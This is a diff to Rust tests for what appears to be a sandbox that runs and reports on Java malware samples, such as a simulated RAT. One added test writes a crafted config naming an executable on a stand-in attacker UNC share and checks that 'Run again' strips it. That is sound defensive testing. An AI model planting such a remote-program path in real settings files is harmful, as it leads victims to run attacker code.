@@ -50,8 +50,8 @@ fn choose_inspect_run_and_open_the_report() {
     assert!(!text.contains("directory:"), "{text}");
     choose_entry(&mut session, &EntryChoice::MainOf { class: wanted.into() });
 
-    session.start().unwrap();
-    assert!(session.start().is_err(), "one analysis at a time");
+    session.start(None).unwrap();
+    assert!(session.start(None).is_err(), "one analysis at a time");
     let status = wait_until_finished(&mut session);
     assert_eq!(status.state, RunState::Finished);
     // With no answers configured the fixture polls its server until the sleep budget ends it.
@@ -88,7 +88,7 @@ fn stopping_from_the_session() {
     session.inspect(sample).unwrap();
     // A run that sleeps in a loop, so there is time to stop it.
     choose_entry(&mut session, &EntryChoice::MainOf { class: "dev.javabyte.guest.sim.Background".into() });
-    session.start().unwrap();
+    session.start(None).unwrap();
     std::thread::sleep(Duration::from_millis(300));
     session.stop().unwrap();
     let status = wait_until_finished(&mut session);
@@ -227,7 +227,7 @@ fn saved_files_limits_comparison_and_run_again() {
 
     // First run: no answers, so the fixture waits for its server.
     choose_entry(&mut session, &EntryChoice::MainOf { class: "dev.javabyte.guest.sim.HttpRat".into() });
-    session.start().unwrap();
+    session.start(None).unwrap();
     wait_until_finished(&mut session);
     let first = session.report().unwrap();
     assert!(first.limits.endings.iter().any(|e| e.outcome == "sleep-budget" && e.next.as_ref().is_some_and(|n| n.setting.as_deref() == Some("network.http"))),
@@ -235,7 +235,7 @@ fn saved_files_limits_comparison_and_run_again() {
 
     // Second run: with answers, it downloads a file and sends results.
     session.set_settings_text(http_rat_settings(&sample.path));
-    session.start().unwrap();
+    session.start(None).unwrap();
     wait_until_finished(&mut session);
     let second = session.report().unwrap();
     assert!(second.config_text.as_deref().is_some_and(|t| t.contains("cdn")), "the run's settings file is shown");
@@ -290,4 +290,14 @@ fn reports_from_the_command_line_open_too() {
     assert_eq!(session.recent()[0].output_dir, folder.display().to_string(), "it joins the recent list");
     assert!(session.open_report_at(&folder.join("report.json")).is_ok(), "the file itself works too");
     assert!(session.open_report_at(&classes).is_err(), "a folder without a report is refused");
+
+    // Someone sends a results folder whose settings name a program for the native bridge:
+    // Run again keeps the plugin but not the program.
+    let crafted = "plugins:\n  native-bridge:\n    python: '\\\\attacker.example\\share\\x.exe'\nlimits:\n  maxSleeps: 3\n";
+    std::fs::write(folder.join("config.yaml"), crafted).unwrap();
+    session.open_report_at(&folder).unwrap();
+    session.run_again().unwrap();
+    let settings = session.settings_text().unwrap();
+    assert!(!settings.contains("python") && !settings.contains("attacker"), "{settings}");
+    assert!(settings.contains("native-bridge") && settings.contains("maxSleeps: 3"), "{settings}");
 }
